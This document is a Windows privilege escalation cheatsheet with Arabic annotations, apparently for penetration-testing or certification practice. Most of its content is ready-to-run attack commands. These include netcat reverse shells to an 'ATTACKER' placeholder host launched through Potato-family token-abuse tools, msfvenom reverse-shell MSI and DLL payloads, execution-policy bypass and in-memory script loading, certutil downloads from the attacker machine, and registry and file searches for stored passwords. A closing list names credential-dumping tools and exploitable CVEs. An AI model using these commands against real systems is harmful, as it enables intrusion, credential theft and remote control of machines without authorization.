# Windows Privilege Escalation Cheatsheet
> CMD vs PowerShell — مرجع سريع





```
powershell -ep bypass
```
---
```
$env:PATH += ";C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\"
```

```
set PATH=%PATH%;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
```

## 🚀 Quick Wins — ابدأ هنا دايماً

| scan                      | CMD                                                                                     | PowerShell                                                             |
| ------------------------- | --------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| **Privileges**            | `whoami /priv`                                                                          | `whoami /priv`                                                         |
| **AlwaysInstallElevated** | `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | `Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer` |
| **Saved Creds**           | `cmdkey /list`                                                                          | `cmdkey /list`                                                         |
| **PS History**            | ❌                                                                                       | `cat (Get-PSReadlineOption).HistorySavePath`                           |
| **مجلدات غريبة**          | `dir C:\`                                                                               | `Get-ChildItem C:\`                                                    |

---

## 💻 System Info

|                      | CMD                                                     | PowerShell                                                                                                                                                                                                                         |
| -------------------- | ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **معلومات النظام**   | `systeminfo`                                            | `Get-ComputerInfo`                                                                                                                                                                                                                 |
| **Hostname**         | `hostname`                                              | `$env:COMPUTERNAME`                                                                                                                                                                                                                |
| **Username**         | `echo %USERNAME%`                                       | `$env:USERNAME`                                                                                                                                                                                                                    |
| **Variables**        | `set`                                                   | `Get-ChildItem Env:`                                                                                                                                                                                                               |
| **OS Version**       | `systeminfo \| findstr /B /C:"OS Name" /C:"OS Version"` | `[System.Environment]::OSVersion`                                                                                                                                                                                                  |
| **Hotfixes**         | `wmic qfe get Caption,HotFixID,InstalledOn`             | `Get-HotFix \| Select HotFixID,InstalledOn \| Sort InstalledOn`                                                                                                                                                                    |
| **Drives**           | `wmic logicaldisk get deviceid,volumename`              | `Get-PSDrive -PSProvider FileSystem`                                                                                                                                                                                               |
| **البرامج المثبتة**  | `wmic product get name,version`                         | `Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* \| Select DisplayName,DisplayVersion,Publisher \| Format-Table -AutoSize`                                                                |
| **البرامج (غير MS)** | ❌                                                       | `Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* \| Select DisplayName,DisplayVersion,Publisher \| Where-Object { $_.Publisher -notmatch "Microsoft\|VMware" } \| Format-Table -AutoSize` |
| **Program Files**    | `dir "C:\Program Files"`                                | `Get-ChildItem 'C:\Program Files','C:\Program Files (x86)' \| ft Parent,Name,LastWriteTime`                                                                                                                                        |

---

## 🌐 Network

| | CMD | PowerShell |
|--|-----|-----------|
| **IP Info** | `ipconfig /all` | `Get-NetIPAddress` |
| **ARP** | `arp -a` | `Get-NetNeighbor` |
| **Routes** | `route print` | `Get-NetRoute` |
| **Connections** | `netstat -ano` | `Get-NetTCPConnection` |
| **Shares** | `net share` | `Get-SmbShare` |
| **DNS Cache** | `ipconfig /displaydns` | `Get-DnsClientCache` |
| **Firewall State** | `netsh firewall show state` | `Get-NetFirewallProfile` |
| **Firewall Config** | `netsh advfirewall firewall dump` | `Get-NetFirewallRule` |

---

## 👥 Users & Groups

| | CMD | PowerShell |
|--|-----|-----------|
| **whoami** | `whoami /all` | `whoami /all` |
| **Privileges** | `whoami /priv` | `whoami /priv` |
| **Groups** | `whoami /groups` | `whoami /groups` |
| **All Users** | `net user` | `Get-LocalUser` |
| **User Details** | `net user <username>` | `Get-LocalUser <username>` |
| **Local Groups** | `net localgroup` | `Get-LocalGroup` |
| **Admins** | `net localgroup administrators` | `Get-LocalGroupMember Administrators` |
| **Password Policy** | `net accounts` | `Get-LocalUser \| Select Name,PasswordExpires` |
| **Logged in** | `query user` | `query user` |

---

## ⚙️ Processes & Services

| | CMD | PowerShell |
|--|-----|-----------|
| **Processes** | `tasklist /v` | `Get-Process` |
| **SYSTEM Processes** | `tasklist /v /fi "username eq system"` | `Get-WmiObject -Query "Select * from Win32_Process" \| where {$_.Name -notlike "svchost*"} \| Select Name,Handle,@{Label="Owner";Expression={$_.GetOwner().User}} \| ft -AutoSize` |
| **Services** | `sc query` | `Get-Service` |
| **Services + Paths** | `wmic service get Caption,StartName,State,pathname` | `Get-WmiObject win32_service \| Select Name,State,PathName` |
| **Running Services** | `net start` | `Get-CimInstance win32_service \| Where {$_.State -eq 'Running'} \| Select Name,State,PathName` |

---

## 🔑 Password Hunting

| | CMD | PowerShell |
|--|-----|-----------|
| **Search Files** | `findstr /si password *.txt *.xml *.ini *.config` | `Get-ChildItem C:\ -Recurse -Include *.txt,*.xml,*.ini -ErrorAction SilentlyContinue \| Select-String -Pattern "password"` |
| **AutoLogon** | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` | `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
| **VNC** | `reg query "HKCU\Software\ORL\WinVNC3\Password"` | `Get-ItemProperty "HKCU:\Software\ORL\WinVNC3" -Name Password -EA SilentlyContinue` |
| **PuTTY** | `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"` | `Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\*"` |
| **Global Search HKLM** | `reg query HKLM /f password /t REG_SZ /s` | ❌ بطيء جداً |
| **PS History** | ❌ | `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| **Clipboard** | ❌ | `Get-Clipboard` |

### Unattend / Sysprep Files

```cmd
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

```
المسارات الشائعة:
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\system32\sysprep\sysprep.xml
```

---

## 🎫 Token Abuse — SeImpersonatePrivilege

```
whoami /priv → ابحث عن SeImpersonatePrivilege = Enabled
```

| Tool | CMD / PowerShell |
|------|-----------------|
| **GodPotato** | `.\GodPotato-NET4.exe -cmd "nc.exe ATTACKER 4444 -e cmd"` |
| **PrintSpoofer** | `.\PrintSpoofer.exe -c "nc.exe ATTACKER 4444 -e cmd"` |
| **JuicyPotato** | `.\JuicyPotato.exe -l 53375 -p cmd.exe -t *` |
| **SweetPotato** | `.\SweetPotato.exe -a "nc.exe ATTACKER 4444 -e cmd"` |

---

## 📦 AlwaysInstallElevated

```cmd
:: CMD — يجب يكون كلاهم 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# PowerShell
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```bash
# Exploit — على Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

---

## 🔧 Service Misconfigurations

| | CMD | PowerShell |
|--|-----|-----------|
| **Service Permissions** | `accesschk64.exe -uwcv Everyone *` | `.\accesschk64.exe -uwcv Everyone *` |
| **File Permissions** | `icacls "C:\path\to\service.exe"` | `Get-Acl "C:\path\to\service.exe" \| Format-List` |
| **Edit BinPath** | `sc config <svc> binpath= "cmd.exe /c whoami"` | `sc.exe config <svc> binpath= "cmd.exe /c whoami"` |
| **Stop Service** | `sc stop <svc>` | `Stop-Service <svc>` |
| **Start Service** | `sc start <svc>` | `Start-Service <svc>` |

### Unquoted Service Paths

```cmd
:: CMD
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
```

```powershell
# PowerShell
Get-WmiObject win32_service | Where {
    $_.StartMode -eq "Auto" -and 
    $_.PathName -notlike "C:\Windows*" -and 
    $_.PathName -notlike '"*'
} | Select PathName,DisplayName,Name
```

---

## 🕒 Scheduled Tasks

| | CMD | PowerShell |
|--|-----|-----------|
| **List All** | `schtasks /query /fo LIST /v` | `Get-ScheduledTask \| Where {$_.TaskPath -notlike "\Microsoft*"} \| ft TaskName,TaskPath,State` |
| **SYSTEM Tasks** | `schtasks /query /fo LIST /v \| findstr "SYSTEM\|Task To Run"` | `Get-ScheduledTask \| Where {$_.Principal.UserId -eq "SYSTEM"}` |

---

## 🚀 Startup Applications

```cmd
:: CMD
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

```powershell
# PowerShell
Get-CimInstance Win32_StartupCommand | Select Name,command,Location,User | fl
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
```

---

## 📂 DLL Hijacking

الـ Execution Policy مانعة. الحل:

powershell

```powershell
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

أو تحمّلها مباشرة من الذاكرة بدون حفظ:

powershell

```powershell
IEX (Get-Content .\PowerUp.ps1 -Raw)
Invoke-AllChecks
```

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

```powershell
# إيجاد DLLs مفقودة
Find-ProcessDLLHijack   # PowerSploit
Find-PathDLLHijack      # PowerSploit

# فحص صلاحيات المجلد
icacls <folder>
Get-Acl <folder> | Format-List
```

```bash
# صنع DLL خبيث — على Kali
msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > hijackme.dll
```

---

## 📤 File Transfer

| | CMD | PowerShell |
|--|-----|-----------|
| **Download HTTP** | `certutil.exe -urlcache -split -f http://KALI/file.exe file.exe` | `iwr http://KALI/file.exe -OutFile file.exe` |
| **Download SMB** | `copy \\KALI\share\tool.exe .` | `Copy-Item \\KALI\share\tool.exe .` |
| **Upload SMB** | `copy file.txt \\KALI\share\` | `Copy-Item file.txt \\KALI\share\` |
| **Encode** | `certutil -encode file.bin encoded.txt` | ❌ |
| **Decode** | `certutil -decode encoded.txt file.bin` | ❌ |

---

## 🤖 Automated Tools

| Tool | CMD / PowerShell |
|------|-----------------|
| **WinPEAS** | `.\winPEASx64.exe` |
| **SharpUp** | `.\SharpUp.exe audit` |
| **Seatbelt** | `.\Seatbelt.exe -group=all` |
| **PowerUp** | `powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"` |
| **PrivescCheck** | `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"` |

---

## ✏️ World-Writable Folders

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\Windows\Temp
C:\Users\Public
C:\JavaTemp
```

---

## 💡 Tips

- **`SeImpersonatePrivilege`** → أول شيء تفحصه بعد ما تحصل على shell
- **`netstat -ano`** → Port على `127.0.0.1` = داخلي فقط، غالباً أقل تأميناً
- **Unquoted paths** مع مسافة = ممكن تحط binary في المجلد الأعلى
- **Windows Defender معطّل؟** افحص `WindowsDefender` في Seatbelt — إذا كل الـ drives مستثناة فأنت حر




المسارات الكاملة للأدوات الشائعة:

```
C:\Windows\System32\whoami.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\net.exe
C:\Windows\System32\netstat.exe
C:\Windows\System32\sc.exe
C:\Windows\System32\schtasks.exe
C:\Windows\System32\reg.exe
C:\Windows\System32\icacls.exe
C:\Windows\System32\takeown.exe
C:\Windows\System32\certutil.exe
C:\Windows\System32\ipconfig.exe
C:\Windows\System32\arp.exe
C:\Windows\System32\route.exe
C:\Windows\System32\tasklist.exe
C:\Windows\System32\query.exe
C:\Windows\System32\runas.exe
C:\Windows\System32\wscript.exe
C:\Windows\System32\cscript.exe
C:\Windows\System32\msiexec.exe
C:\Windows\System32\rundll32.exe
C:\Windows\System32\wbem\wmic.exe
C:\Windows\SysWOW64\wbem\wmic.exe
```

استخدامها في PowerShell لما يقول "not recognized":

powershell

```powershell
C:\Windows\System32\wbem\wmic.exe qfe get Caption,HotFixID
C:\Windows\System32\cmd.exe /c systeminfo
C:\Windows\System32\cmd.exe /c hostname
```





**أدوات الاستطلاع:**

- nmap, feroxbuster, dirb, nikto, enum4linux, nbtscan, samrdump

**استغلال Linux:**

- linpeas.sh (تصعيد الصلاحيات)
- pspy64 (مراقبة العمليات)
- socat, nc (netcat)

**استغلال ثغرات محددة:**

- CVE-2021-22204 (ExifTool RCE)
- CVE-2021-3560 (Polkit)
- CVE-2020-14144 (Gitea RCE)
- CVE-2023-32315 (Openfire)
- CVE-2019-7214 (SmarterMail)
- redis-rce / redis-rogue-server (Redis RCE)
- raptor_udf2 / MySQL UDF (تصعيد MySQL)
- Werkzeug exploit
- ZoneMinder RCE
- H2 Database RCE

**أدوات Windows:**

- mimikatz.exe
- winPEASx64.exe
- PowerUp.ps1
- Seatbelt.exe / SharpUp.exe
- GodPotato / SweetPotato / PrintSpoofer / FullPowers (تصعيد الصلاحيات)
- PsExec64.exe
- nc.exe
- wesng (Windows Exploit Suggester)
- PrivescCheck.ps1

**كسر كلمات المرور:**

- hydra, hashcat/mdxfind

**أخرى:**

- impacket (ntlmrelayx)
- msfvenom (إنشاء payloads)


**🔍 استطلاع:**

- **nmap** - يكشف البورتات والخدمات
- **feroxbuster / dirb** - يبحث عن مجلدات مخفية على الويب
- **nikto** - يفحص ثغرات الويب
- **enum4linux** - يجمع معلومات SMB/Windows

---

**🐧 Linux Privesc:**

- **linpeas** - يبحث تلقائياً عن طرق تصعيد الصلاحيات
- **pspy64** - يراقب العمليات والـ cronjobs بدون صلاحيات root

---

**🪟 Windows Privesc:**

- **winPEAS** - نفس linpeas بس لـ Windows
- **PowerUp / SharpUp** - يبحث عن misconfigurations
- **Seatbelt** - يجمع معلومات النظام
- **wesng** - يقترح exploits حسب الـ patches المفقودة

---

**⬆️ تصعيد صلاحيات Windows:**

- **GodPotato / SweetPotato / PrintSpoofer** - تحويل SeImpersonate إلى SYSTEM
- **FullPowers** - استعادة صلاحيات Token

---

**🔑 كلمات مرور:**

- **mimikatz** - يسحب الباسووردات من الذاكرة
- **hydra** - brute force

---

**🌐 أدوات شبكة:**

- **nc (netcat)** - reverse shell وتحويل البورتات
- **socat** - مثل netcat لكن أقوى
- **impacket** - هجمات شبكة Windows (NTLM relay إلخ)








---
---
---
---


### Privilege Escalation
Situational Awareness
User/Group Privileges
PowerShell History(Transcription, Script Logging)
Sensitive Files
Insecure Service Executables
DLL hijacking
Unquoted Service Path
Application-based exploits
Kernel Exploits
Check root, user home, Documents, Desktop, Downloads directories.
































































































































































































































































































































